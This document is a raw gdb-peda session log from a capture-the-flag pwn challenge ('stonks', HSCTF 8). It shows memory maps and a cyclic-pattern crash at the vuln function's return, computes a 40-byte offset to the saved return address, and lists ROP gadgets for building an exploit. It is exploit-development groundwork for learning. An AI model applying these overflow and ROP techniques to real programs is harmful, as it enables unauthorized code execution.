@@ -1,0 +1,93 @@
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r--p	/home/mito/CTF/HSCTF_8/Pwn_stonks/chal
+0x00401000         0x00402000         r-xp	/home/mito/CTF/HSCTF_8/Pwn_stonks/chal
+0x00402000         0x00403000         r--p	/home/mito/CTF/HSCTF_8/Pwn_stonks/chal
+0x00403000         0x00404000         r--p	/home/mito/CTF/HSCTF_8/Pwn_stonks/chal
+0x00404000         0x00405000         rw-p	/home/mito/CTF/HSCTF_8/Pwn_stonks/chal
+0x00007ffff79e2000 0x00007ffff7bc9000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7bc9000 0x00007ffff7dc9000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dc9000 0x00007ffff7dcd000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcd000 0x00007ffff7dcf000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcf000 0x00007ffff7dd3000 rw-p	mapped
+0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7fd5000 0x00007ffff7fd7000 rw-p	mapped
+0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+gdb-peda$ x/80gx 0x00404000
+0x404000:	0x0000000000403e20	0x00007ffff7ffe170
+0x404010:	0x00007ffff7dea8f0	0x0000000000401030
+0x404020:	0x0000000000401040	0x0000000000401050
+0x404030:	0x0000000000401060	0x00007ffff7a633d0
+0x404040:	0x0000000000401080	0x0000000000000000
+0x404050:	0x0000000000000000	0x0000000000000000
+0x404060 <stdout@@GLIBC_2.2.5>:	0x00007ffff7dce760	0x0000000000000000
+0x404070 <stdin@@GLIBC_2.2.5>:	0x00007ffff7dcda00	0x0000000000000000
+0x404080:	0x0000000000000000	0x0000000000000000
+0x404090:	0x0000000000000000	0x0000000000000000
+
+
+mito@ubuntu:~/CTF/HSCTF_8/Pwn_stonks$ gdb -q ./chal
+Reading symbols from ./chal...(no debugging symbols found)...done.
+gdb-peda$ pattc 256
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G'
+gdb-peda$ run
+Starting program: /home/mito/CTF/HSCTF_8/Pwn_stonks/chal 
+Advanced AI Stock Price Predictor
+Please enter the stock ticker symbol: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G
+AAA%AAsAABAA$AAnAACAA-AA(AAD will increase by $3 today!
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x39 ('9')
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7ffff7dcf8c0 --> 0x0 
+RSI: 0x7fffffffb730 ("AAA%AAsAABAA$AAnAACAA-AA(AAD\003 will increase by $3 today!\n")
+RDI: 0x1 
+RBP: 0x6141414541412941 ('A)AAEAAa')
+RSP: 0x7fffffffddf8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%"...)
+RIP: 0x4012c2 (<vuln+83>:	ret)
+R8 : 0x39 ('9')
+R9 : 0x0 
+R10: 0x0 
+R11: 0x246 
+R12: 0x4010f0 (<_start>:	endbr64)
+R13: 0x7fffffffdee0 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4012bb <vuln+76>:	call   0x4010b0 <printf@plt>
+   0x4012c0 <vuln+81>:	nop
+   0x4012c1 <vuln+82>:	leave  
+=> 0x4012c2 <vuln+83>:	ret    
+   0x4012c3 <main>:	endbr64 
+   0x4012c7 <main+4>:	push   rbp
+   0x4012c8 <main+5>:	mov    rbp,rsp
+   0x4012cb <main+8>:	lea    rdi,[rip+0xd86]        # 0x402058
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffddf8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%"...)
+0008| 0x7fffffffde00 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA"...)
+0016| 0x7fffffffde08 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0024| 0x7fffffffde10 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0032| 0x7fffffffde18 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0040| 0x7fffffffde20 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0048| 0x7fffffffde28 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0056| 0x7fffffffde30 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00000000004012c2 in vuln ()
+gdb-peda$ patto AA0A
+AA0A found at offset: 40
+
+0x0000000000401363: pop rdi; ret; 
+0x0000000000401361: pop rsi; pop r15; ret; 
+
